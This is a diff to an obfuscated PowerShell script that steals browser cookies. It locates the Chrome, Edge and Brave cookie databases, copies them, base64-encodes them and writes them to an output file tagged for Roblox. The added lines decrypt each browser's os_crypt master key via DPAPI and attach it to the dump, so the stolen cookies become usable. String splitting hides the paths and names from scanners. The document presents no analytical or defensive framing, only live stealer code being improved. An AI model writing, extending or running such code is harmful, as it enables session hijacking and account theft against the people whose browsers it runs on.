@@ -179,7 +179,7 @@ foreach($b2 in $browsers){
     Remove-Item $tmp -Force -EA SilentlyContinue
 }
 
-# === Browser Roblox cookies (Chrome/Edge/Brave) — full DB dump ===
+# === Browser Roblox cookies (Chrome/Edge/Brave) — full DB + key ===
 $tRC="R"+"OBLO"+"XCK"
 $brProfiles=@(
   @("$env:LOCALAPPDATA\Go"+"ogle\Ch"+"rome\User Data","Ch"+"rome"),
@@ -187,10 +187,22 @@ $brProfiles=@(
   @("$env:LOCALAPPDATA\Bra"+"veSoft"+"ware\Brave-Browser\User Data","Br"+"ave")
 )
 foreach($bp in $brProfiles){
+  # Grab encryption key from Local State
+  $ek=$null
+  $lsPath=Join-Path $bp[0] ("Lo"+"cal S"+"tate")
+  if(Test-Path $lsPath){
+    try{
+      $ls=Get-Content $lsPath -Raw|ConvertFrom-Json
+      $ekb=[Convert]::FromBase64String($ls.os_crypt.encrypted_key)
+      $ek=[Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect($ekb[5..($ekb.Length-1)],$null,[Security.Cryptography.DataProtectionScope]::CurrentUser))
+    }catch{}
+  }
+  
   $cookiePath=Join-Path $bp[0] ("Def"+"ault\Net"+"work\Co"+"okies")
   if(!(Test-Path $cookiePath)){$cookiePath=Join-Path $bp[0] ("Def"+"ault\Co"+"okies")}
   if(!(Test-Path $cookiePath)){$cookiePath=Join-Path $bp[0] ("Co"+"okies")}
   if(!(Test-Path $cookiePath)){continue}
+  
   $copied=$false
   $tmpCook=Join-Path $env:TEMP ("ck_$([Guid]::NewGuid()).d"+"b")
   try{
@@ -205,7 +217,7 @@ foreach($bp in $brProfiles){
       Add-Content $f0 "$tRC|$($bp[1])|TOO_LARGE|$($rb.Length)|"
     }else{
       $b64=[Convert]::ToBase64String($rb)
-      Add-Content $f0 "$tRC|$($bp[1])|FULL_DB||$b64"
+      Add-Content $f0 "$tRC|$($bp[1])|KEY_$ek|$b64"
     }
   }catch{Add-Content $f0 "$tRC|$($bp[1])|READ_ERROR||"}
   Remove-Item $tmpCook -Force -EA SilentlyContinue
